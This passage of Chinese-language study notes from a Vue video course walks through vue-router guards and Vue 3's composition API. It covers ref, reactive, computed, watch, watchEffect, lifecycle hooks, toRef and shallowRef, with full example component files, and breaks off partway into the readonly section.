                           //props的第三种写法,值为函数  $route.query.id
                           props({ query: { id, title } }){
                               return {
                                   id,
                                   title
                               }
                           }
                       }
                   ],
                   //meta:路由元信息，可以配置是否需要校验的信息
                   meta:{
                       isAuth: true,
                       title: '消息'
                   }
               }
           ]
       }
   ]
});

//全局前置路由守卫
//初始化和在每一次路由切换之前被调用
// router.beforeEach((to, from, next) => {
//     // console.log(to, from);
//     console.log('前置路由守卫');
//     const { isAuth } = to.meta;
//     if(isAuth){
//         //代表需要鉴权
//         if(localStorage.getItem('school') === 'wust1') next();//类似于nodejs中间件
//         else alert('无权限');
//     }else{
//         next();
//     }
// });

//全局后置路由守卫
//初始化和在每一次路由切换之后被调用
router.afterEach(( to, from ) => {
    console.log('后置路由守卫', to, from);
    //点击每一个路由都切换西夏document.title
    const { title } = to.meta;
    document.title = title || 'vue-advance';
})


export default router;
```

https://www.bilibili.com/video/BV1Zy4y1K7SH?p=131

---

### 组件内路由守卫

改动

About.vue

```
<template>
  <h2>我是About的内容</h2>
</template>

<script>
export default {
  name: "About",
  mounted() {
    //输出它身上的路由
    console.log('The route of About', this.$route);
  },
  //组件内路由守卫

  //与前置和后置是两码事
  //通过路由规则进入该组件时被调用,注意一定是通过路由规则进入组件，普通的组件装载是不会调用的
  beforeRouteEnter(to, from, next){
    console.log('App---beforeRouteEnter');
    console.log(from, to);
    const { isAuth } = to.meta;
    if(isAuth){
             //代表需要鉴权
      if(localStorage.getItem('school') === 'wust1') next();//类似于nodejs中间件
      else alert('无权限');
    }else{
      next();
    }
  },
  //通过路由规则离开该组件时被调用
  beforeRouteLeave(to, from, next){
    console.log('App---beforeRouteLeave');
    console.log(from, to);
    next();
  }
}
</script>

<style scoped>

</style>
```

https://www.bilibili.com/video/BV1Zy4y1K7SH?p=132

---

### history模式与hash模式

https://www.bilibili.com/video/BV1Zy4y1K7SH?p=133

---

### element-ui

element-ui官网

https://element.eleme.cn/#/zh-CN/component/quickstart

![image](14F8EA8B5E2A4BA89887C784DC5454BA)

https://www.bilibili.com/video/BV1Zy4y1K7SH?p=134

---

### element-ui按需引入

https://www.bilibili.com/video/BV1Zy4y1K7SH?p=135

---

### Vue3

https://www.bilibili.com/video/BV1Zy4y1K7SH?p=136

---

### vue-cli创建vue3项目

https://www.bilibili.com/video/BV1Zy4y1K7SH?p=137

---

### vite打包

https://www.bilibili.com/video/BV1Zy4y1K7SH?p=138

---

### Vue3工程结构

https://www.bilibili.com/video/BV1Zy4y1K7SH?p=139

---

### Vue3

文件结构

![image](5EB01AE3119747158AAFAB167A16269B)

main.js
```
//引入不再是Vue构造函数了，引入的是一个名为createApp的工厂函数
//注意在这里无法像vue2那样去书写了，(这里并不兼容)
import { createApp } from 'vue'
import App from './App.vue'

//创建应用实例对象---app类似于vue2中vm,但app比vm更轻
const app = createApp(App);
// console.log(app);
//挂载
app.mount('#app');

// setTimeout(() => {
//     app.unmount("#app");
// },2000)

// //vue2写法
// const vm = new Vue({
//     render: h=> h(App)
// });
// vm.$mount('#app')
```

App.vue
```
<template>
  <!--vue3的组件模版结构可以没有根标签-->
  <img alt="Vue logo" src="./assets/logo.png">
  <HelloWorld msg="Welcome to Your Vue.js App"/>
</template>

<script>
import HelloWorld from './components/HelloWorld.vue'

export default {
  name: 'App',
  components: {
    HelloWorld
  }
}
</script>

<style>
#app {
  font-family: Avenir, Helvetica, Arial, sans-serif;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  text-align: center;
  color: #2c3e50;
  margin-top: 60px;
}
</style>
```

HelloWorld.vue
```
<template>
  <div class="hello">
    <h1>{{ msg }}</h1>
    <p>
      For a guide and recipes on how to configure / customize this project,<br>
      check out the
      <a href="https://cli.vuejs.org" target="_blank" rel="noopener">vue-cli documentation</a>.
    </p>
    <h3>Installed CLI Plugins</h3>
    <ul>
      <li><a href="https://github.com/vuejs/vue-cli/tree/dev/packages/%40vue/cli-plugin-babel" target="_blank" rel="noopener">babel</a></li>
      <li><a href="https://github.com/vuejs/vue-cli/tree/dev/packages/%40vue/cli-plugin-eslint" target="_blank" rel="noopener">eslint</a></li>
    </ul>
    <h3>Essential Links</h3>
    <ul>
      <li><a href="https://vuejs.org" target="_blank" rel="noopener">Core Docs</a></li>
      <li><a href="https://forum.vuejs.org" target="_blank" rel="noopener">Forum</a></li>
      <li><a href="https://chat.vuejs.org" target="_blank" rel="noopener">Community Chat</a></li>
      <li><a href="https://twitter.com/vuejs" target="_blank" rel="noopener">Twitter</a></li>
      <li><a href="https://news.vuejs.org" target="_blank" rel="noopener">News</a></li>
    </ul>
    <h3>Ecosystem</h3>
    <ul>
      <li><a href="https://router.vuejs.org" target="_blank" rel="noopener">vue-router</a></li>
      <li><a href="https://vuex.vuejs.org" target="_blank" rel="noopener">vuex</a></li>
      <li><a href="https://github.com/vuejs/vue-devtools#vue-devtools" target="_blank" rel="noopener">vue-devtools</a></li>
      <li><a href="https://vue-loader.vuejs.org" target="_blank" rel="noopener">vue-loader</a></li>
      <li><a href="https://github.com/vuejs/awesome-vue" target="_blank" rel="noopener">awesome-vue</a></li>
    </ul>
  </div>
</template>

<script>
export default {
  name: 'HelloWorld',
  props: {
    msg: String
  }
}
</script>

<!-- Add "scoped" attribute to limit CSS to this component only -->
<style scoped>
h3 {
  margin: 40px 0 0;
}
ul {
  list-style-type: none;
  padding: 0;
}
li {
  display: inline-block;
  margin: 0 10px;
}
a {
  color: #42b983;
}
</style>
```

---

### setup

文件结构

```
//引入不再是Vue构造函数了，引入的是一个名为createApp的工厂函数
//注意在这里无法像vue2那样去书写了，(这里并不兼容)
import { createApp } from 'vue'
import App from './App.vue'

//创建应用实例对象---app类似于vue2中vm,但app比vm更轻
const app = createApp(App);
// console.log(app);
//挂载
app.mount('#app');

// setTimeout(() => {
//     app.unmount("#app");
// },2000)

// //vue2写法
// const vm = new Vue({
//     render: h=> h(App)
// });
// vm.$mount('#app')
```

App.vue
```
<template>
  <!--vue3的组件模版结构可以没有根标签-->
  <h1>我是app组件</h1>
  <h1>我叫{{ name }}, {{ age }}岁</h1>
  <button @click="sayHello">hello!!</button>
  <h3>msg: {{ vue2 }}</h3>
  <p>数据冲突该怎么办？{{ a }}</p>
  <button @click="test1">测试一下在vue2中去读取vue3的配置</button>
  <button @click="test2">测试一下在vue3的setup中去读取vue2的配置</button>
</template>

<script>
// import { h } from 'vue';
export default {
  name: 'App',
  //此处只是测试setup，暂时先不考虑响应式的问题
  //测试使用vue2的内容
  data(){
    return {
      vue2: 'still can use vue2 in vue3 code',
      a:1
    }
  },
  methods:{
    //vue2配置方法的方式
    test1(){
      console.log(this.vue2);
      console.log(this.name);
      console.log(this.sayHello);
      this.sayHello();
    }
  },
  setup(){
    //表演的舞台
    //准备数据 data
    let name = 'py';
    let age = 21;
    let a = 300;

    //方法 methods
    function sayHello(){
      alert(`My name is ${name}, ${age} ${age === 1  ? 'year' : 'years'} old`);
    }


    //在vue3的配置里去读取vue2的属性
    function test2(){
      console.log(name);
      console.log(age);
      console.log(sayHello);
      console.log(this.vue2);
      console.log(this.test1);
    }


    //返回一个对象
    return {
      name,
      age,
      sayHello,
      test2,
      a
    }

    //返回一个渲染函数
    //这是直接将你在这里渲染的东西替换到template中
    // return () => h('h1', 'hello');
  }
}
</script>

<style>
#app {
  font-family: Avenir, Helvetica, Arial, sans-serif;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  text-align: center;
  color: #2c3e50;
  margin-top: 60px;
}
</style>
```

---

### ref函数

文件结构

![image](269B6F320C0641CE929F7C6FAC916BF1)

main.js

```
//引入不再是Vue构造函数了，引入的是一个名为createApp的工厂函数
//注意在这里无法像vue2那样去书写了，(这里并不兼容)
import { createApp } from 'vue'
import App from './App.vue'

//创建应用实例对象---app类似于vue2中vm,但app比vm更轻
const app = createApp(App);
// console.log(app);
//挂载
app.mount('#app');

// setTimeout(() => {
//     app.unmount("#app");
// },2000)

// //vue2写法
// const vm = new Vue({
//     render: h=> h(App)
// });
// vm.$mount('#app')
```

App.vue
```
<template>
  <!--vue3的组件模版结构可以没有根标签-->
  <h1>我是app组件</h1>
  <h1>我叫{{ name }}, {{ age }}岁</h1>
  <h3>职位:{{ job.type }}</h3>
  <h3>薪水:{{ job.salary }}</h3>
  <button @click="changeInfo">修改人的信息</button>
</template>

<script>
import { ref } from 'vue';
export default {
  name: 'App',
  setup(){
    //表演的舞台(setup)
    //准备数据 data
    //ref实现响应式(基本类型)也是采用Object.definedProperty()来实现的 getter和setter
    let name = ref('py'); //ref引用对象
    let age = ref(21);
    //ref实现响应式(对象类型)也是采用Proxy来实现
    let job = ref({
      type: 'frontend developer',
      salary: '30'
    });

    function changeInfo(){
      name.value = '李四';
      age.value = 42;
      job.value.type = 'UI developer';
      console.log(name, age); //不是响应式的
    }

    //返回一个对象
    return {
      name,
      age,
      job,
      changeInfo
    }
  }
}
</script>

<style>
#app {
  font-family: Avenir, Helvetica, Arial, sans-serif;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  text-align: center;
  color: #2c3e50;
  margin-top: 60px;
}
</style>
```

---

### reactive函数

文件结构

![image](EC05A40920834C9AA39506562D299250)

main.js
```
//引入不再是Vue构造函数了，引入的是一个名为createApp的工厂函数
//注意在这里无法像vue2那样去书写了，(这里并不兼容)
import { createApp } from 'vue'
import App from './App.vue'

//创建应用实例对象---app类似于vue2中vm,但app比vm更轻
const app = createApp(App);
// console.log(app);
//挂载
app.mount('#app');

// setTimeout(() => {
//     app.unmount("#app");
// },2000)

// //vue2写法
// const vm = new Vue({
//     render: h=> h(App)
// });
// vm.$mount('#app')
```

App.vue
```
<template>
  <!--vue3的组件模版结构可以没有根标签-->
  <h1>我是app组件</h1>
  <h1>我叫{{ person.name }}, {{ person.age }}岁</h1>
  <h3>职位:{{ person.type }}</h3>
  <h3>薪水:{{ person.salary }}</h3>
  <h3>爱好:{{ person.hobbies }}</h3>
  <h4>测试的数据c:{{ person.a.b.c }}</h4>
  <button @click="changeInfo">修改人的信息</button>
</template>

<script>
import { reactive } from 'vue';
export default {
  name: 'App',
  setup(){
    //表演的舞台(setup)
    //准备数据 data
    //ref实现响应式(基本类型)也是采用Object.definedProperty()来实现的 getter和setter
    // let name = ref('py'); //ref引用对象(RefImpl)实例
    // let age = ref(21);
    //ref实现响应式(对象类型)也是采用Proxy来实现(proxy) 这里如果就算是用ref也是借助了reactive
    let person = reactive({
      name: 'py',
      age: 21,
      type: 'frontend developer',
      salary: '30',
      hobbies: ['抽烟', '喝酒', '烫头'],
      a:{
        b:{
          c: 666
        }
      }
    });


    function changeInfo(){
      person.name = '李四';
      person.age = 42;
      // job.value.type = 'xxx'
      person.type = 'UI developer';
      //测试reactive能否监测深层次变化
      person.a.b.c = 100;
      person.hobbies[0] = 'play tennis';
      // console.log(name, age); //不是响应式的
    }

    //返回一个对象
    return {
      person,
      changeInfo
    }
  }
}
</script>

<style>
#app {
  font-family: Avenir, Helvetica, Arial, sans-serif;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  text-align: center;
  color: #2c3e50;
  margin-top: 60px;
}
</style>
```

---

### vue3响应式原理

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>v3响应式</title>
</head>
<body>
    <script type="text/javascript">
        let person = {
            name: '张三',
            age: 18
        };

        //模拟vue2中的响应式
        // let p = {};
        // Object.defineProperty(p, 'name', {
        //     get(){
        //         //get name
        //         return person.name;
        //     },
        //     set(value){
        //         //set name
        //         console.log('name changed, must change the page');
        //         person.name = value;
        //     }
        // })
        //
        // Object.defineProperty(p, 'age', {
        //     configurable: true,
        //     get(){
        //         //get age
        //         return person.age;
        //     },
        //     set(value){
        //         //set age
        //         console.log('age changed, must change the page');
        //         person.age = value;
        //     }
        // })

        //vue3的响应式
        const p = new Proxy(person,{
            //读取
            get(target, propName){
                //person ==> target
                console.log('读取');
                return Reflect.get(target,propName);
            },
            set(target, propName, value) {
                // 修改和增加属性都调用
                console.log('修改');
                Reflect.set(target, propName, value);
            },
            //删除
            deleteProperty(target, propName) {
                console.log(`删除`);
                return Reflect.deleteProperty(target, propName);
            }
        });

        // let obj = {
        //     a:1,
        //     b:2
        // }
        //
        // const x1 = Reflect.defineProperty(obj, 'c',{
        //     get(){
        //         return 3;
        //     }
        // });
        // console.log(x1); //true 成
        // const x2 = Reflect.defineProperty(obj, 'c',{
        //     get(){
        //         return 4;
        //     }
        // });
        // if(x2){
        //     console.log(x2); //false 否
        // }
        // Reflect.get(obj,'a');
    </script>
</body>
</html>
```

---

### setup注意点

文件结构

![image](8B2654DD29B547E6BA3A0EDAEE55D041)

main.js
```
//引入不再是Vue构造函数了，引入的是一个名为createApp的工厂函数
//注意在这里无法像vue2那样去书写了，(这里并不兼容)
import { createApp } from 'vue'
import App from './App.vue'

//创建应用实例对象---app类似于vue2中vm,但app比vm更轻
const app = createApp(App);
// console.log(app);
//挂载
app.mount('#app');

// setTimeout(() => {
//     app.unmount("#app");
// },2000)

// //vue2写法
// const vm = new Vue({
//     render: h=> h(App)
// });
// vm.$mount('#app')
```

App.vue
```
<template>
  <!--vue3的组件模版结构可以没有根标签-->
  <Demo @hello="showHelloMsg" msg="hello" school="wust">
    <template v-slot:qwe>
      没事
    </template>
    <template v-slot:asd>
      love you
    </template>
  </Demo>
</template>

<script>
import Demo from "./components/Demo";
export default {
  name: 'App',
  components: {Demo},
  setup(){
    return {
      showHelloMsg(value){
        alert(`你好,${value}`);
      }
    }
  }
}
</script>

<style>
#app {
  font-family: Avenir, Helvetica, Arial, sans-serif;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  text-align: center;
  color: #2c3e50;
  margin-top: 60px;
}
</style>
```

Demo.vue
```
<template>
  <!--vue3的组件模版结构可以没有根标签-->
  <h1>我是app组件</h1>
  <h1>我叫{{ person.name }}, {{ person.age }}岁</h1>
  <button @click="test">测试触发一次demo的自定义事件</button>
</template>

<script>
import { reactive } from 'vue';
export default {
  name: 'Demo',
  beforeCreate() {
    console.log('----@bc');
  },
  props: ['msg', 'school'],
  emits:['hello'],
  setup(props, context){
    // console.log('----setup');
    // console.log(this); ///undefined
    console.log(props); //props: 外部给组件丢的参数 => 响应式(Proxy实例)
    //表演的舞台(setup)
    //准备数据 data
    //ref实现响应式(基本类型)也是采用Object.definedProperty()来实现的 getter和setter
    // let name = ref('py'); //ref引用对象(RefImpl)实例
    // let age = ref(21);
    //ref实现响应式(对象类型)也是采用Proxy来实现(proxy) 这里如果就算是用ref也是借助了reactive
    let person = reactive({
      name: 'py',
      age: 21,
    });

    // console.log(context, context.attrs); 相当于vue2中的$attrs
    // console.log(context,context.slots); 插槽

    //返回一个对象
    return {
      person,
      test(){
        context.emit('hello', 666); //触发自定义事件
      }
    }
  }
}
</script>

<style>
</style>
```

---

### 计算属性

文件结构

![image](A9682C23B0BA4B0DADFA1BA6E3A0B387)

main.js

```
//引入不再是Vue构造函数了，引入的是一个名为createApp的工厂函数
//注意在这里无法像vue2那样去书写了，(这里并不兼容)
import { createApp } from 'vue'
import App from './App.vue'

//创建应用实例对象---app类似于vue2中vm,但app比vm更轻
const app = createApp(App);
// console.log(app);
//挂载
app.mount('#app');

// setTimeout(() => {
//     app.unmount("#app");
// },2000)

// //vue2写法
// const vm = new Vue({
//     render: h=> h(App)
// });
// vm.$mount('#app')
```

App.vue
```
<template>
  <!--vue3的组件模版结构可以没有根标签-->
  <Demo/>
</template>

<script>
import Demo from "./components/Demo";
export default {
  name: 'App',
  components: {Demo},
  setup(){
  }
}
</script>

<style>
#app {
  font-family: Avenir, Helvetica, Arial, sans-serif;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  text-align: center;
  color: #2c3e50;
  margin-top: 60px;
}
</style>
```

Demo.vue
```
<template>
  <h1>一个人的信息</h1>
  姓:<input type="text" v-model="person.firstName"/>
  <br/>
  名:<input type="text" v-model="person.lastName"/>
  <p>姓名:{{ person.fullName }}</p>
  <br/>
  修改全名:<input type="text" v-model="person.fullName"/>
</template>

<script>
import { reactive, computed } from 'vue';
export default {
  name: 'Demo',
  //vue2的写法
  // computed:{
  //   fullName(){
  //     //vue2看得到vue3 注意
  //     return this.person.firstName + '-' + this.person.lastName;
  //   }
  // },
  setup(){
    let person = reactive({
      firstName: 'pan',
      lastName: 'yue',
      age: 21,
    });

    //计算属性(简写，没有考虑计算属性被修改的情况)
    // person.fullName = computed(() => {
    //   return person.firstName + '-' + person.lastName;
    // })

    //计算属性(完整写法，既考虑了读也考虑了改)
    person.fullName = computed({
      get(){
        return person.firstName + '-' + person.lastName
      },
      set(name){
        let [ fn, ln ] = name.split('-');
        //响应式
        person.firstName = fn;
        person.lastName = ln;
      }
    })

    //返回一个对象
    return {
      person,
    }
  }
}
</script>

<style>
</style>
```

---

### watch函数

文件结构

![image](AE1C6F529F2A45EA89F3BDBF9F4DEF4E)

main.js
```
//引入不再是Vue构造函数了，引入的是一个名为createApp的工厂函数
//注意在这里无法像vue2那样去书写了，(这里并不兼容)
import { createApp } from 'vue'
import App from './App.vue'

//创建应用实例对象---app类似于vue2中vm,但app比vm更轻
const app = createApp(App);
// console.log(app);
//挂载
app.mount('#app');

// setTimeout(() => {
//     app.unmount("#app");
// },2000)

// //vue2写法
// const vm = new Vue({
//     render: h=> h(App)
// });
// vm.$mount('#app')
```

App.vue
```
<template>
  <!--vue3的组件模版结构可以没有根标签-->
  <Demo/>
</template>

<script>
import Demo from "./components/Demo";
export default {
  name: 'App',
  components: {Demo},
  setup(){
  }
}
</script>

<style>
#app {
  font-family: Avenir, Helvetica, Arial, sans-serif;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  text-align: center;
  color: #2c3e50;
  margin-top: 60px;
}
</style>
```

Demo.vue
```
<template>
   <h1>当前求和为:{{ sum }}</h1>
   <button @click="sum++">点我加一</button>
   <hr/>
   <h2>当前的信息为:{{ msg }}</h2>
   <button @click="msg += '!'">修改信息</button>
   <hr/>
   <h2>姓名:{{ person.name }}</h2>
   <h2>年龄:{{ person.age }}</h2>
   <h2>薪资:{{ person.job.j1.salary }}K</h2>
  <button @click="person.name = person.name + '~'">修改姓名</button>
  <button @click="person.age++">增长年龄</button>
  <button @click="person.job.j1.salary++">增长薪资</button>
</template>

<script>
import { ref, reactive, watch } from 'vue';
export default {
  name: 'Demo',
  //vue2中的watch写法
  // watch:{
  //   //简单写法
  //   // sum(nv,ov){
  //   //   console.log('sum的值发生变化了');
  //   //   console.log(`newValue:${nv}, oldValue:${ov}`);
  //   // }
  //
  //   //完整写法
  //   sum:{
  //     deep: true, //深度监视
  //     immediate: true, //一开始就监视一下
  //     handler(nv,ov){
  //         console.log('sum的值发生变化了');
  //         console.log(`newValue:${nv}, oldValue:${ov}`);
  //     }
  //   }
  // },
  setup(){

    let sum = ref(0);
    let msg = ref('你好');
    let person = reactive({
      name: '张三',
      age: 18,
      job:{
        j1:{
          salary: 20
        }
      }
    })

    //情况一: 监视ref所定义的响应式数据
    // watch(sum, (nv, ov) => {
    //   //这里我并不需要this，所以剪头函数，普通函数我可以乱粥
    //   console.log('sum的值发生变化了');
    //   console.log(`newValue:${nv}, oldValue:${ov}`);
    // }, {
    //   //监视的配置
    //   immediate: true //一上来就更新
    // });

    //情况二:监视ref所定义的多个响应式数据
    // watch([sum, msg], (nv, ov) => {
    //   //此时nv和ov都是被监视属性值的数组
    //   // console.log(Array.isArray(ov)); //true
    //   console.log('sum的值或者msg的值发生变化了');
    //   console.log(`newValue:${nv}, oldValue:${ov}`);
    // },{
    //   immediate: true
    // });

    /**
     * 情况三:监视reactive所定义的一个响应式数据
     * 坑:1.此处无法获取正确的ov(oldValue)
     *    2.强制开启了深度监视
     */
    // watch(person, (nv, ov) => {
    //   console.log('person变化了');
    //   console.log(nv, ov);
    // }, {
    //   deep: false //此处的deep配置是无效的
    // });

    //情况四：监视reactive所定义的响应式中的某一个属性
    // watch(() => person.age, (nv, ov) => {
    //   console.log('person的age变了', nv, ov);
    // })

    //情况五:监视reactive所定义的响应式中的某些属性:并不只是一个
    // watch([() => person.age, () => person.name], (nv, ov) => {
    //   //此时nv和ov都是数组
    //   console.log('person的age或name发生改变了',nv, ov);
    // });

    //特殊情况
    // watch(() => person.job, (nv, ov) => {
    //   //这里依然无法拿到正确的ov，因为依然监视的是对象
    //   console.log('person的job信息发生改变了',nv, ov);
    // }, {
    //   //这里必须要加deep:true注意
    //   deep: true //此处因为监视的是reactive所定义的响应式对象的一个属性(这个属性的值它依然是一个对象)，所以deep配置有效
    // })

    //返回一个对象
    return {
      sum,
      msg,
      person
    }
  }
}
</script>

<style>
</style>
```

---

### watch检测ref数据

文件结构

![image](87FAC0B94BDB48999EA49A957E77C155)

改动

```
<template>
   <h1>当前求和为:{{ sum }}</h1>
   <button @click="sum++">点我加一</button>
   <hr/>
   <h2>当前的信息为:{{ msg }}</h2>
   <button @click="msg += '!'">修改信息</button>
   <hr/>
   <h2>姓名:{{ person.name }}</h2>
   <h2>年龄:{{ person.age }}</h2>
   <h2>薪资:{{ person.job.j1.salary }}K</h2>
  <button @click="person.name = person.name + '~'">修改姓名</button>
  <button @click="person.age++">增长年龄</button>
  <button @click="person.job.j1.salary++">增长薪资</button>
</template>

<script>
import {ref, watch} from 'vue';
export default {
  name: 'Demo',
  setup(){

    let sum = ref(0);
    let msg = ref('你好');
    let person = ref({
      name: '张三',
      age: 18,
      job:{
        j1:{
          salary: 20
        }
      }
    });

    //监测的不是一个值，而是一个保存值的结构(不能写成sum.value) 不能监视一个具体的值注意
    watch(sum, (nv, ov) => {
       console.log(nv, ov);
    });

    console.log(person);

    //person是RefImpl
    //开启深度监视不会存在问题
    // watch(person, (nv, ov) => {
    //   console.log(nv, ov);
    // },{
    //   deep: true
    // });

    //这里如果不是person.value则会出现问题 因为person是一个RefImpl(默认没开启深度监视)
    //但是person.value是一个借助了proxy生成的reactive响应式对象 所以这里可以解决问题
    // watch(person.value, (nv, ov) => {
    //   console.log(nv, ov);
    // });

    console.log(sum);
    console.log(msg);
    console.log(person);

    //返回一个对象
    return {
      sum,
      msg,
      person
    }
  }
}
</script>

<style>
</style>
```

---

### watchEffect函数

文件结构

![image](1C257DC04D464B0DAFFC67245BF30420)

Demo.vue
```
<template>
   <h1>当前求和为:{{ sum }}</h1>
   <button @click="sum++">点我加一</button>
   <hr/>
   <h2>当前的信息为:{{ msg }}</h2>
   <button @click="msg += '!'">修改信息</button>
   <hr/>
   <h2>姓名:{{ person.name }}</h2>
   <h2>年龄:{{ person.age }}</h2>
   <h2>薪资:{{ person.job.j1.salary }}K</h2>
  <button @click="person.name = person.name + '~'">修改姓名</button>
  <button @click="person.age++">增长年龄</button>
  <button @click="person.job.j1.salary++">增长薪资</button>
</template>

<script>
import {reactive, ref, watch, watchEffect} from 'vue';
export default {
  name: 'Demo',
  setup(){

    let sum = ref(0);
    let msg = ref('你好');
    let person = reactive({
      name: '张三',
      age: 18,
      job:{
        j1:{
          salary: 20
        }
      }
    });

    //监测的不是一个值，而是一个保存值的结构(不能写成sum.value) 不能监视一个具体的值注意
    watch(sum, (nv, ov) => {
       console.log(nv, ov);
    },{
      immediate: true
    });

    //watchEffect
    //不确定监视对象
    //默认开启了immediate:true
    watchEffect(() => {
      console.log(`watch effect指定的回调执行了！！`)
      //依赖收集,你用到了谁它就监视谁！！
      //这里用到sum, person.job.j1.salary了,所以可以被监视到(只要它们发生变化就重新执行watchEffect)
      //与computed有点类似，依赖收集.(侧重点不一致,watchEffect注重过程,而computed注重计算函数的返回值)
      const x1 = sum.value;
      const x2 = person.job.j1.salary;
    })


    //返回一个对象
    return {
      sum,
      msg,
      person
    }
  }
}
</script>

<style>
</style>
```

---

### vue3生命周期

main.js

```
//引入不再是Vue构造函数了，引入的是一个名为createApp的工厂函数
//注意在这里无法像vue2那样去书写了，(这里并不兼容)
import { createApp } from 'vue'
import App from './App.vue'

//创建应用实例对象---app类似于vue2中vm,但app比vm更轻
const app = createApp(App);
// console.log(app);
//挂载
app.mount('#app');

// setTimeout(() => {
//     app.unmount("#app");
// },2000)

// //vue2写法
// const vm = new Vue({
//     render: h=> h(App)
// });
// vm.$mount('#app')
```

App.vue
```
<template>
  <!--vue3的组件模版结构可以没有根标签-->
  <button @click="isShowDemo = !isShowDemo">{{ isShowDemo ? '隐藏' : '显示'}}</button>
  <Demo v-if="isShowDemo"/>
</template>

<script>
import Demo from "./components/Demo";
import { ref } from "vue";
export default {
  name: 'App',
  components: {Demo},
  setup(){
    let isShowDemo = ref(true);
    return {
      isShowDemo
    }
  }
}
</script>

<style>
#app {
  font-family: Avenir, Helvetica, Arial, sans-serif;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  text-align: center;
  color: #2c3e50;
  margin-top: 60px;
}
</style>
```

Demo.vue
```
<template>
   <h1>当前求和为:{{ sum }}</h1>
   <button @click="sum++">点我加一</button>

   <hr/>
</template>

<script>
import { ref, onBeforeMount, onMounted, onBeforeUpdate, onUpdated, onBeforeUnmount, onUnmounted } from 'vue';
export default {
  name: 'Demo',
  setup(){
    let sum = ref(0);

    //通过组合式api的形式去使用生命周期钩子
    ///setup()相当于beforeCreate()和created()
    onBeforeMount(() => {  console.log('----beforeMount----'); });
    onMounted(() => {  console.log('-----mounted-----'); });
    onBeforeUpdate(() => {  console.log('-----beforeUpdate-----') });
    onUpdated(() => { console.log('-----updated-----'); });
    onBeforeUnmount(() => { console.log('-----beforeUnmount----'); });
    onUnmounted(() => { console.log('-----unmounted----'); })

    console.log('-----setup----')

    //返回一个对象
    return {
      sum,
    }
  },
  //使用配置项的形式使用生命周期钩子
  // beforeCreate() {
  //   console.log('----beforeCreate!!----');
  // },
  // created() {
  //   console.log('----created!!----');
  // },
  // beforeMount() {
  //   console.log('----beforeMount----');
  // },
  // mounted() {
  //   console.log('-----mounted-----');
  // },
  // beforeUpdate() {
  //   console.log('-----beforeUpdate-----')
  // },
  // updated() {
  //   console.log('-----updated-----');
  // },
  // beforeUnmount() {
  //   console.log('-----beforeUnmount----');
  // },
  // unmounted() {
  //   console.log('-----unmounted----');
  // }
}
</script>

<style>
</style>
```

---

### toRef

文件结构

![image](98DA3DBC6D5B41E0A2E12A1519DD899B)

Demo.vue
```
<template>
  <h4>{{ person }}</h4>
  <h2>姓名:{{ name }}</h2>
  <h2>年龄:{{ age }}</h2>
  <h2>薪资:{{ salary }}K</h2>
  <button @click="name = name + '~'">修改姓名</button>
  <button @click="age++">增长年龄</button>
  <button @click="salary++">增长薪资</button>
</template>

<script>
import { ref, reactive, toRef, toRefs} from 'vue';
export default {
  name: 'Demo',
  setup(){
    let person = reactive({
      name: '张三',
      age: 18,
      job:{
        j1:{
          salary: 20
        }
      }
    });

    //ref类型的值在模板里使用是不需要.value来取的
    const name1 = person.name //注意输出字符串，并不是响应式的数据
    console.log('@@@@@', name1);
    const name2 = toRef(person,name); //RefImpl 这里的name2与person.name是完全一模一样的(你改这里的name2与你改person.name是一码事),且数据还是响应式的
    console.log('####', name2);

    const x = toRefs(person);
    console.log(x);


    //返回一个对象(toRef是引用 name就是person.name且为响应式)
    //toRef处理一个，而toRefs处理一群
    //大白话:toRef(s)就是方便我们把响应式数据(ref,reactive)展开丢出去，方便在模版中应用
    return {
      person,
      // name: toRef(person, "name"),
      // age: toRef(person, "age"),
      // salary: toRef(person.job.j1, "salary")
      ...toRefs(person),
      salary: toRef(person.job.j1, 'salary')  //toRef可以与toRefs连用,更加方便
    };


    //注意千万不能这样写
    //一旦这样写就与元数据分离了,改name不会引起person.name的变化(因为ref把name值包装成了一个refImpl对象)
    // return {
    //   person,
    //   name: ref(person.name),
    //   age: ref(person.age),
    //   salary: ref(person.job.j1.salary)
    // };
  }
}
</script>

<style>
</style>
```

---

### shallowRef

文件结构

![image](F92D129364684DB69900EB4ACC41ADB7)

改动

Demo.vue
```
<template>
  <h2>当前的y是:{{ x.y }}</h2>
  <button @click="x = {y : 888}">点我替换x</button>
  <button @click="x.y++">点我y+1</button>
  <hr/>
  <h4>{{ person }}</h4>
  <h2>姓名:{{ name }}</h2>
  <h2>年龄:{{ age }}</h2>
  <h2>薪资:{{ job.j1.salary }}K</h2>
  <button @click="name = name + '~'">修改姓名</button>
  <button @click="age++">增长年龄</button>
  <button @click="job.j1.salary++">增长薪资</button>
</template>

<script>
import {ref,reactive, toRefs, shallowReactive, shallowRef} from 'vue';
export default {
  name: 'Demo',
  setup(){
    //shallowReactive只考虑对象类型的第一层数据响应式
    // let person = shallowReactive({
    //   name: '张三',
    //   age: 18,
    //   job:{
    //     j1:{
    //       salary: 20
    //     }
    //   }
    // });

    let person = reactive({
      name: '张三',
      age: 18,
      job:{
        j1:{
          salary: 20
        }
      }
    });

    // let x = ref(0);

    //传递基本类型来说,ref与shallowRef基本是没什么区别的
    // let x = shallowRef(0);
    //但注意对象类型shallowRef不去处理，而ref底层回去借助reactive生成proxy对象(getter/setter)
    //但注意不管是shallowR还是非shallow, 第一层都是响应式的(不如下面的x依然是响应式数据)
    let x = shallowRef({ y: 0 });

    console.log(x);

    // let x = ref({ y: 0 })

    return {
      person,
      ...toRefs(person),
      x,
    };

  }
}
</script>

<style>
</style>
```

---

### readonly

文件结构

![image](2D0F8BC5DF824933A94C811B84B3E4FC)

改动

Demo.vue

```
<template>
  <h2>当前求和为:{{ sum }}</h2>
  <button @click="sum++">sum+1</button>
  <hr/>
  <h2>姓名:{{ name }}</h2>
  <h2>年龄:{{ age }}</h2>
  <h2>薪资:{{ job.j1.salary }}K</h2>
  <button @click="name = name + '~'">修改姓名</button>
